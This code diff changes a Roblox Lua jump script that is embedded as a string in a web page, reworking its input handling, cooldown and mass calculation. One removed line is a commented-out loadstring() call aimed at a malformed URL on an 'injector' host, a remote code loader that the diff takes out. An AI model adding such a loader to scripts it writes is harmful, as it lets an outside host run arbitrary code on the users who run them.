@@ -57,7 +57,6 @@
 
   <script>
     const aeScript = `local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
@@ -67,34 +66,45 @@ local humanoid = character:WaitForChild("Humanoid")
 -- Configuration
 local jumpStrength = 115
 local canJump = true
+local cooldownTime = 0.5
 
+-- Disable default jump height so our VectorForce takes over
+humanoid.JumpPower = 0 
 
-local attachment = Instance.new("Attachment", hrp)
-local vForce = Instance.new("VectorForce", hrp)
+-- Setup Physics Objects
+local attachment = Instance.new("Attachment")
+attachment.Parent = hrp
+
+local vForce = Instance.new("VectorForce")
 vForce.Attachment0 = attachment
 vForce.Force = Vector3.new(0, 0, 0)
 vForce.RelativeTo = Enum.ActuatorRelativeTo.World
+vForce.Parent = hrp
 
-UserInputService.InputBegan:Connect(function(input, processed)
-    if processed then return end
-    
-    if input.KeyCode == Enum.KeyCode.Space and canJump then
- 
-        if humanoid.FloorMaterial ~= Enum.Material.Air then
-            canJump = false
-            
-            -- Apply the upward force based on mass (makes it consistent)
-            local mass = hrp.AssemblyMass
-            vForce.Force = Vector3.new(0, jumpStrength * mass, 0)
-            
-         
-            task.wait(0.1)
-            vForce.Force = Vector3.new(0, 0, 0)
-            
-            task.wait(0.4)
-            canJump = true
-        --loadstring()httpswa://injector-etn4gizuf-hnjutyuts-projects.vercel.app/lua.lua
+-- This function runs regardless of the device type (PC/Mobile/Console)
+humanoid.Jumping:Connect(function(active)
+    -- 'active' is true the moment the player tries to jump
+    if active and canJump and humanoid.FloorMaterial ~= Enum.Material.Air then
+        canJump = false
+        
+        -- Calculate mass of the entire character for consistent height
+        local totalMass = 0
+        for _, part in pairs(character:GetChildren()) do
+            if part:IsA("BasePart") then
+                totalMass = totalMass + part:GetMass()
+            end
         end
+        
+        -- Apply the Force
+        vForce.Force = Vector3.new(0, jumpStrength * totalMass, 0)
+        
+        -- Short delay for the "push" upward
+        task.wait(0.1)
+        vForce.Force = Vector3.new(0, 0, 0)
+        
+        -- Cooldown before allowing another jump
+        task.wait(cooldownTime)
+        canJump = true
     end
 end)
 `;
